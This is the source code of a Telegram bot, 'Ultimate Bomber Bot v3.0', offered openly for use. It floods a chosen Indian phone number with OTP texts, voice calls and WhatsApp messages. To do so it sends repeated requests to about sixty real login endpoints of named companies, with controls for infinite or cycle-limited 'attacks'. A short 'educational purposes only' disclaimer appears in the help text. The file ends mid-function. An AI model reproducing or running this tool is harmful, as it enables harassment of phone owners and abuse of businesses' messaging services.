#!/usr/bin/env python3

import asyncio
import aiohttp
import random
import re
import time
import signal
import sys
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart, Command
from aiogram.client.default import DefaultBotProperties
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
import logging
import os
from aiohttp import web
from supabase import create_client, Client

# Optional: load .env for local development
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# --- ENV CONFIG (Railway uses environment variables) ---
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
SUPABASE_URL = os.environ.get("SUPABASE_URL", "")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY", "")

if not BOT_TOKEN:
    logger.critical("❌ BOT_TOKEN environment variable is not set!")
    sys.exit(1)
if not SUPABASE_URL or not SUPABASE_KEY:
    logger.critical("❌ SUPABASE_URL / SUPABASE_KEY environment variables are not set!")
    sys.exit(1)

# --- DATABASE CONFIG ---
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# --- CONFIGURATION ---
DEVELOPER_ID = "@Katmoxx"
DEVELOPER_USERNAME = "Katmoxx"

# Required Channels (A to Z Force Join)
REQUIRED_CHANNELS = [
    {"name": "𝑵𝑶𝑻 𝑬𝑻𝑯𝑰𝑪𝑨𝑳", "link": "https://t.me/notethicalteam", "id": -1003932964389},
]
CHANNEL_ID = True  # Flag for original logic consistency

# Admin user IDs
ADMIN_IDS = [5817712676, ]

# Global variables
PROTECTED_NUMBERS = set()
stop_signals = {}
user_attacks = {}
attack_stats = {}
user_sessions = {}

# Animation frames
ANIMATION_FRAMES = [
    "🌀 Loading...",
    "⚡ Preparing...",
    "🔥 Igniting...",
    "💥 Exploding...",
    "🚀 Launching...",
    "🎯 Targeting...",
    "⚔️ Attacking...",
    "💀 Destroying..."
]

# Initialize bot
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
storage = MemoryStorage()
dp = Dispatcher(storage=storage)


# States
class ProtectState(StatesGroup):
    waiting_for_number = State()
    waiting_for_remove = State()


class AttackState(StatesGroup):
    waiting_for_number = State()
    waiting_for_cycles = State()


class AdminState(StatesGroup):
    waiting_for_broadcast = State()
    waiting_for_ban = State()
    waiting_for_unban = State()


# --- COMPLETE API COLLECTION (MERGED FROM BOTH FILES) ---
ULTIMATE_APIS = [
    # === CALL APIs ===
    {
        "name": "Tata Capital Voice Call",
        "type": "Call",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'
    },
    {
        "name": "1MG Voice Call",
        "type": "Call",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'
    },
    {
        "name": "Swiggy Call Verification",
        "type": "Call",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Flipkart Voice Call",
        "type": "Call",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Amazon Voice Call",
        "type": "Call",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&action=voice_otp"
    },
    {
        "name": "Myntra Voice Call",
        "type": "Call",
        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Paytm Voice Call",
        "type": "Call",
        "url": "https://accounts.paytm.com/signin/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Zomato Voice Call",
        "type": "Call",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&type=voice"
    },
    {
        "name": "MakeMyTrip Voice Call",
        "type": "Call",
        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Ola Voice Call",
        "type": "Call",
        "url": "https://api.olacabs.com/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Uber Voice Call",
        "type": "Call",
        "url": "https://auth.uber.com/v2/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },

    # === SMS APIs ===
    {
        "name": "Lenskart SMS",
        "type": "SMS",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'
    },
    {
        "name": "PharmEasy SMS",
        "type": "SMS",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Wakefit SMS",
        "type": "SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Hungama OTP",
        "type": "SMS",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
    },
    {
        "name": "Snitch SMS",
        "type": "SMS",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'
    },
    {
        "name": "ShipRocket SMS",
        "type": "SMS",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    {
        "name": "GoKwik SMS",
        "type": "SMS",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'
    },
    {
        "name": "NoBroker SMS",
        "type": "SMS",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&countryCode=IN"
    },
    {
        "name": "Byju's SMS",
        "type": "SMS",
        "url": "https://api.byjus.com/v2/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Meru Cab",
        "type": "SMS",
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "name": "Doubtnut SMS",
        "type": "SMS",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
    },
    {
        "name": "PenPencil SMS",
        "type": "SMS",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    {
        "name": "BeepKart SMS",
        "type": "SMS",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","city":362}}'
    },
    {
        "name": "Smytten SMS",
        "type": "SMS",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}'
    },
    {
        "name": "NewMe SMS",
        "type": "SMS",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'
    },
    {
        "name": "MyHubble Money SMS",
        "type": "SMS",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'
    },
    {
        "name": "Housing.com SMS",
        "type": "SMS",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'
    },
    {
        "name": "Khatabook SMS",
        "type": "SMS",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'
    },
    {
        "name": "Animall SMS",
        "type": "SMS",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'
    },
    {
        "name": "Cosmofeed SMS",
        "type": "SMS",
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'
    },
    {
        "name": "Spencer's SMS",
        "type": "SMS",
        "url": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "PokerBaazi SMS",
        "type": "SMS",
        "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'
    },
    {
        "name": "My11Circle SMS",
        "type": "SMS",
        "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'
    },
    {
        "name": "RummyCircle SMS",
        "type": "SMS",
        "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}'
    },
    {
        "name": "Apna SMS",
        "type": "SMS",
        "url": "https://production.apna.co/api/userprofile/v1/otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","hash_type":"play_store"}}'
    },
    {
        "name": "Rapido SMS",
        "type": "SMS",
        "url": "https://customer.rapido.bike/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "MamaEarth SMS",
        "type": "SMS",
        "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Country Delight SMS",
        "type": "SMS",
        "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","platform":"Android","mode":"new_user"}}'
    },
    {
        "name": "Mpokket SMS",
        "type": "SMS",
        "url": "https://web-api.mpokket.in/registration/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "TrulyMadly SMS",
        "type": "SMS",
        "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","locale":"IN"}}'
    },
    {
        "name": "BetterHalf SMS",
        "type": "SMS",
        "url": "https://api.betterhalf.ai/v2/auth/otp/send/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","isd_code":"91"}}'
    },
    {
        "name": "Charzer SMS",
        "type": "SMS",
        "url": "https://api.charzer.com/auth-service/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","appSource":"CHARZER_APP"}}'
    },
    {
        "name": "Apollo Pharmacy SMS",
        "type": "SMS",
        "url": "https://www.apollopharmacy.in/sociallogin/mobile/sendotp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile={phone}"
    },
    {
        "name": "MagicBricks SMS",
        "type": "SMS",
        "url": "https://accounts.magicbricks.com/userauth/api/validate-mobile",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "ConfirmTKT SMS",
        "type": "SMS",
        "url": lambda phone: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "JustDial SMS",
        "type": "SMS",
        "url": "https://www.justdial.com/functions/whatsappverification.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mob={phone}&vcode=&rsend=0&name=dev"
    },
    {
        "name": "Fast SMS API 1",
        "type": "SMS",
        "url": lambda phone: f"https://fast-sms-xi.vercel.app/send-otp?phone_number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Fast SMS API 2",
        "type": "SMS",
        "url": lambda phone: f"https://sms-api-lemon.vercel.app/api/src?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "IndiaLends SMS",
        "type": "SMS",
        "url": "https://indialends.com/internal/a/otp.ashx",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"log_mode=1&ctrl={phone}"
    },

    # === WhatsApp APIs ===
    {
        "name": "KPN WhatsApp",
        "type": "WhatsApp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
    },
    {
        "name": "Rappi WhatsApp",
        "type": "WhatsApp",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'
    },
    {
        "name": "Eka Care WhatsApp",
        "type": "WhatsApp",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'
    },
    {
        "name": "Foxy WhatsApp",
        "type": "WhatsApp",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'
    },
    {
        "name": "Stratzy WhatsApp",
        "type": "WhatsApp",
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNo":"{phone}"}}'
    },
    {
        "name": "Jockey WhatsApp",
        "type": "WhatsApp",
        "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        "method": "GET",
        "headers": {},
        "data": None
    },
]


# --- UTILITY FUNCTIONS ---
def is_valid_indian_number(number):
    """Check if number is valid Indian mobile number"""
    if not number:
        return False

    cleaned = ''.join(filter(str.isdigit, str(number)))

    if cleaned.startswith('91') and len(cleaned) > 10:
        cleaned = cleaned[2:]
    elif cleaned.startswith('0') and len(cleaned) > 10:
        cleaned = cleaned[1:]

    return bool(re.match(r"^[6-9]\d{9}$", cleaned))


def clean_phone_number(number):
    """Clean and format phone number to 10 digits"""
    if not number:
        return None

    cleaned = ''.join(filter(str.isdigit, str(number)))

    if cleaned.startswith('91') and len(cleaned) > 10:
        cleaned = cleaned[2:]
    elif cleaned.startswith('0') and len(cleaned) > 10:
        cleaned = cleaned[1:]

    return cleaned if len(cleaned) == 10 else None


# --- DB HELPERS ---
async def sync_user(user_id, username=None):
    """Sync user to Supabase Cloud"""
    try:
        supabase.table("users").upsert({
            "id": user_id,
            "username": username or f"User_{user_id}"
        }).execute()
    except Exception as e:
        logger.error(f"DB Sync failed: {e}")


async def log_attack(user_id, target, mode):
    """Log attack to Supabase (using activity_logs table)"""
    try:
        await sync_user(user_id)
        supabase.table("activity_logs").insert({
            "user_id": user_id,
            "action": "ATTACK_START",
            "details": f"Target: {target} | Mode: {mode}"
        }).execute()
    except Exception as e:
        logger.error(f"DB Log failed: {e}")


async def get_db_stats():
    """Get global stats from Supabase"""
    u_count = 0
    a_count = 0
    try:
        res_users = supabase.table("users").select("id", count="exact").execute()
        u_count = res_users.count if res_users.count is not None else 0
    except Exception as e:
        logger.error(f"User stats fetch failed: {e}")

    try:
        res_attacks = supabase.table("activity_logs").select("id", count="exact").eq("action", "ATTACK_START").execute()
        a_count = res_attacks.count if res_attacks.count is not None else 0
    except Exception as e:
        logger.error(f"Attack stats fetch failed: {e}")

    return u_count, a_count


async def is_user_banned(user_id):
    """Check if user is banned in Supabase"""
    try:
        res = supabase.table("users").select("is_banned").eq("id", user_id).execute()
        if res.data:
            return res.data[0].get("is_banned", False)
    except Exception as e:
        logger.debug(f"Ban check failed for {user_id}: {e}")
    return False


async def check_subscription(user_id):
    """Check if user is subscribed to ALL required channels"""
    if user_id in ADMIN_IDS:
        return True

    for channel in REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(chat_id=channel["id"], user_id=user_id)
            if member.status not in ["member", "administrator", "creator", "restricted"]:
                logger.info(f"User {user_id} not in channel {channel['id']} (Status: {member.status})")
                return False
        except Exception as e:
            logger.error(f"Subscription check failed for {channel['name']} ({channel['id']}): {e}")
            return False
    return True


async def hit_api(session, api, phone, stats):
    """Hit a single API endpoint"""
    try:
        url = api["url"]
        data = api["data"](phone) if api["data"] else None

        if callable(url):
            url = url(phone)

        headers = api.get("headers", {})
        headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        })

        async with session.request(
            method=api["method"],
            url=url,
            headers=headers,
            data=data,
            timeout=aiohttp.ClientTimeout(total=6),
            ssl=False
        ) as response:
            status = response.status
            if status in [200, 201, 202, 204]:
                api_type = api.get("type", "SMS")
                stats[api_type] = stats.get(api_type, 0) + 1
                return True
    except Exception as e:
        logger.debug(f"API {api.get('name', 'Unknown')} failed: {str(e)[:100]}")
    return False


async def animate_message(chat_id, message_id, text_prefix="", frames=None):
    """Animate a message with loading frames"""
    if frames is None:
        frames = ANIMATION_FRAMES

    for frame in frames:
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"{frame} {text_prefix}"
            )
            await asyncio.sleep(0.5)
        except:
            break


# --- KEYBOARD FUNCTIONS ---
def create_main_keyboard():
    builder = ReplyKeyboardBuilder()
    builder.row(types.KeyboardButton(text="🚀 START ATTACK"))
    builder.row(types.KeyboardButton(text="⚡ QUICK ATTACK"))
    builder.row(
        types.KeyboardButton(text="🛡️ PROTECT NUMBER"),
        types.KeyboardButton(text="🗑️ REMOVE PROTECTION")
    )
    builder.row(
        types.KeyboardButton(text="📊 CHECK STATS"),
        types.KeyboardButton(text="👤 MY PROFILE")
    )
    builder.row(
        types.KeyboardButton(text="ℹ️ HELP"),
        types.KeyboardButton(text="👨‍💻 DEVELOPER")
    )
    return builder.as_markup(resize_keyboard=True)


def create_attack_keyboard():
    builder = ReplyKeyboardBuilder()
    builder.row(types.KeyboardButton(text="🛑 STOP ATTACK"))
    builder.row(types.KeyboardButton(text="📊 LIVE STATS"))
    builder.row(types.KeyboardButton(text="⚡ SPEED UP"), types.KeyboardButton(text="🐢 SLOW DOWN"))
    builder.row(types.KeyboardButton(text="🏠 MAIN MENU"))
    return builder.as_markup(resize_keyboard=True)


def create_join_keyboard():
    builder = InlineKeyboardBuilder()
    for channel in REQUIRED_CHANNELS:
        builder.row(types.InlineKeyboardButton(text=f"📢 Join {channel['name']}", url=channel['link']))
    builder.row(types.InlineKeyboardButton(text="✅ Verify Join", callback_data="verify_join"))
    return builder.as_markup()


def create_stats_keyboard():
    builder = InlineKeyboardBuilder()
    builder.row(
        types.InlineKeyboardButton(text="🔄 Refresh", callback_data="refresh_stats"),
        types.InlineKeyboardButton(text="📈 View All", callback_data="view_all_stats")
    )
    return builder.as_markup()


def create_admin_keyboard():
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="📊 GLOBAL STATS", callback_data="adm_stats"))
    builder.row(types.InlineKeyboardButton(text="📢 BROADCAST", callback_data="adm_bc"))
    builder.row(
        types.InlineKeyboardButton(text="🚫 BAN USER", callback_data="adm_ban"),
        types.InlineKeyboardButton(text="✅ UNBAN USER", callback_data="adm_unban")
    )
    return builder.as_markup()


def create_quick_attack_keyboard():
    builder = InlineKeyboardBuilder()
    builder.row(
        types.InlineKeyboardButton(text="🚀 Bomb Now", callback_data="quick_bomb"),
        types.InlineKeyboardButton(text="🔙 Change Number", callback_data="change_number")
    )
    builder.row(
        types.InlineKeyboardButton(text="⚡ 10 Cycles", callback_data="cycles_10"),
        types.InlineKeyboardButton(text="🔥 20 Cycles", callback_data="cycles_20")
    )
    return builder.as_markup()


# --- HANDLERS ---
@dp.message(CommandStart())
async def cmd_start(message: types.Message):
    user_id = message.from_user.id

    if await is_user_banned(user_id):
        return await message.answer("<b>🚫 YOUR ACCESS IS REVOKED!</b>\n\nYou have been banned from using this bot.")

    await sync_user(user_id, message.from_user.username)
    user_sessions[user_id] = {
        "number": None,
        "is_bombing": False,
        "last_stats": None
    }

    if message.chat.type != 'private':
        return await message.answer(
            "<b>🚀 ULTIMATE BOMBER PRO IS ACTIVE!</b>\n\n"
            "To use in this group:\n"
            "🔹 Use <code>/bomb 9876543210</code>\n"
            "🔹 Use <code>/stop</code> to end\n\n"
            "<i>For the full control panel, please message me in Private!</i>"
        )

    if CHANNEL_ID and not await check_subscription(user_id):
        await message.answer(
            "<b>🔒 ACCESS REQUIRED!</b>\n\n"
            "To use <b>ULTIMATE BOMBER BOT</b>, join our channels:\n\n"
            "Join and click 'Verify Join' to continue.",
            reply_markup=create_join_keyboard()
        )
        return

    welcome_text = f"""
<b>💀 ULTIMATE BOMBER BOT v3.0 💀</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>👨‍💻 Developer:</b> {DEVELOPER_ID}
<b>⚡ Status:</b> <code>ACTIVE & READY</code>
<b>🛡️ Security:</b> <code>ENABLED</code>
<b>🎯 Total APIs:</b> <code>{len(ULTIMATE_APIS)}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>📊 API Breakdown:</b>
• 📞 Call APIs: {len([a for a in ULTIMATE_APIS if a['type'] == 'Call'])}
• 📩 SMS APIs: {len([a for a in ULTIMATE_APIS if a['type'] == 'SMS'])}
• 💬 WhatsApp APIs: {len([a for a in ULTIMATE_APIS if a['type'] == 'WhatsApp'])}
━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>⚠️ Warning:</b> Use responsibly!
For educational purposes only.
━━━━━━━━━━━━━━━━━━━━━━━━━━
<i>Select an option below:</i>
    """

    await sync_user(user_id, message.from_user.username)
    await message.answer(welcome_text, reply_markup=create_main_keyboard())


@dp.callback_query(F.data == "verify_join")
async def verify_join(callback: types.CallbackQuery):
    user_id = callback.from_user.id

    if await check_subscription(user_id):
        await callback.message.edit_text(
            "<b>✅ ACCESS GRANTED!</b>\n\n"
            "Welcome to <b>ULTIMATE BOMBER BOT</b>!\n"
            "Use the keyboard below to start."
        )
        await callback.answer("Verification successful!")

        await callback.message.answer(
            "<b>🏠 MAIN MENU</b>\n\nSelect an option:",
            reply_markup=create_main_keyboard()
        )
    else:
        await callback.answer(
            "❌ You haven't joined the channel yet!",
            show_alert=True
        )


@dp.message(F.text == "👨‍💻 DEVELOPER")
async def show_developer(message: types.Message):
    dev_text = f"""
<b>👨‍💻 DEVELOPER INFORMATION</b>
━━━━━━━━━━━━━━━━━━━━
<b>Name:</b> {DEVELOPER_ID}
<b>Bot:</b> Ultimate Bomber v3.0
<b>Total APIs:</b> {len(ULTIMATE_APIS)}
<b>Status:</b> 🔥 Online

<b>API Breakdown:</b>
• 📞 Call: {len([a for a in ULTIMATE_APIS if a['type'] == 'Call'])}
• 📩 SMS: {len([a for a in ULTIMATE_APIS if a['type'] == 'SMS'])}
• 💬 WhatsApp: {len([a for a in ULTIMATE_APIS if a['type'] == 'WhatsApp'])}

<b>Features:</b>
• Real-time Attacks
• Number Protection
• Multi-API Support
• Speed Control
• Statistics Tracking

<b>Contact:</b> {DEVELOPER_ID}
━━━━━━━━━━━━━━━━━━━━
<i>For support and updates</i>
    """
    await message.answer(dev_text)


@dp.message(F.text == "ℹ️ HELP")
async def show_help(message: types.Message):
    help_text = f"""
<b>🆘 HELP & GUIDE</b>
━━━━━━━━━━━━━━━━━━━━

<b>How to Use:</b>
1. Join our channel (if required)
2. Click '🚀 START ATTACK' for infinite attack
3. Click '⚡ QUICK ATTACK' for limited attack
4. Enter 10-digit target number
5. Attack will start automatically

<b>Commands:</b>
• /start - Start bot
• /help - Show this help
• /stats - Show statistics
• /stop - Stop current attack
• /profile - Show your profile

<b>Attack Types:</b>
• 🚀 START ATTACK - Infinite loop attack
• ⚡ QUICK ATTACK - Limited cycles attack
• 📞 Calls - Voice call OTPs
• 📩 SMS - Text message OTPs
• 💬 WhatsApp - WhatsApp messages

<b>Protection System:</b>
• Add your numbers to protected list
• Protected numbers won't be attacked
• Useful for your own numbers

<b>⚠️ Important:</b>
• Use responsibly
• Don't attack emergency numbers
• This is for educational purposes
• Developer: {DEVELOPER_ID}
━━━━━━━━━━━━━━━━━━━━
    """
    await message.answer(help_text)


@dp.message(F.text == "🛡️ PROTECT NUMBER")
async def ask_protect(message: types.Message, state: FSMContext):
    if CHANNEL_ID and not await check_subscription(message.from_user.id):
        return

    await message.answer(
        "<b>🛡️ NUMBER PROTECTION</b>\n\n"
        "Enter the 10-digit number you want to protect:\n"
        "Example: <code>9876543210</code>\n\n"
        "This number will be safe from all attacks."
    )
    await state.set_state(ProtectState.waiting_for_number)


@dp.message(ProtectState.waiting_for_number)
async def process_protect(message: types.Message, state: FSMContext):
    number = clean_phone_number(message.text.strip())

    if not number or not is_valid_indian_number(number):
        await message.answer(
            "<b>❌ Invalid Number!</b>\n"
            "Please enter a valid 10-digit Indian number starting with 6-9.\n"
            "Example: <code>9876543210</code>"
        )
        return

    PROTECTED_NUMBERS.add(number)
    await message.answer(
        f"<b>✅ NUMBER PROTECTED!</b>\n\n"
        f"Number: <code>{number}</code>\n"
        f"Status: 🛡️ SAFE\n\n"
        f"This number is now immune to all attacks."
    )
    await state.clear()


@dp.message(F.text == "🗑️ REMOVE PROTECTION")
async def ask_remove_protect(message: types.Message, state: FSMContext):
    if CHANNEL_ID and not await check_subscription(message.from_user.id):
        return

    if not PROTECTED_NUMBERS:
        await message.answer(
            "<b>📭 No Protected Numbers</b>\n\n"
            "You haven't protected any numbers yet."
        )
        return

    protected_list = "\n".join([f"• <code>{num}</code>" for num in PROTECTED_NUMBERS])
    await message.answer(
        f"<b>🗑️ REMOVE PROTECTION</b>\n\n"
        f"Currently Protected Numbers:\n{protected_list}\n\n"
        f"Enter the number to remove from protection:"
    )
    await state.set_state(ProtectState.waiting_for_remove)


@dp.message(ProtectState.waiting_for_remove)
async def process_remove_protect(message: types.Message, state: FSMContext):
    number = clean_phone_number(message.text.strip())

    if not number:
        await message.answer(
            "<b>❌ Invalid Number!</b>\n"
            "Please enter a valid 10-digit number."
        )
        return

    if number in PROTECTED_NUMBERS:
        PROTECTED_NUMBERS.remove(number)
        await message.answer(
            f"<b>✅ PROTECTION REMOVED!</b>\n\n"
            f"Number: <code>{number}</code>\n"
            f"Status: ⚠️ VULNERABLE\n\n"
            f"This number can now be attacked."
        )
    else:
        await message.answer(
            f"<b>❌ NOT FOUND!</b>\n\n"
            f"Number <code>{number}</code> is not in protected list."
        )

    await state.clear()


@dp.message(F.text == "👤 MY PROFILE")
async def show_profile(message: types.Message):
